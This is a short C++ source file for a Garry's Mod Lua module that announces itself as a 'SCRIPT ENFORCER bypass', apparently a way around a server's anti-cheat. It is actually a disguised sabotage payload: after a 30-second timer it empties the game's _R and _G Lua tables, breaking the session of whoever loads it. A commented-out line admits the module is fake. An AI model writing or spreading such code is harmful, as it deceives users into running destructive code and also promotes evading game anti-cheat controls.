
#undef _UNICODE
#include <windows.h>
#include "GMLuaModule.h"


GMOD_MODULE(Open, Close);


int Open(lua_State *L) {
	Lua()->Msg("SCRIPT ENFORCER bypass by HeX loaded!\n");
	//Lua()->Msg("or, actually, wait, no it isn't cause this module is a load of bull crap!\n");

	Lua()->RunString("WUT", "OhCrap", " timer.Simple(30, function() table.Empty(_R) table.Empty(_G) end) ", true, true);

	return 0;
}


int Close(lua_State *L) {
	return 0;
}



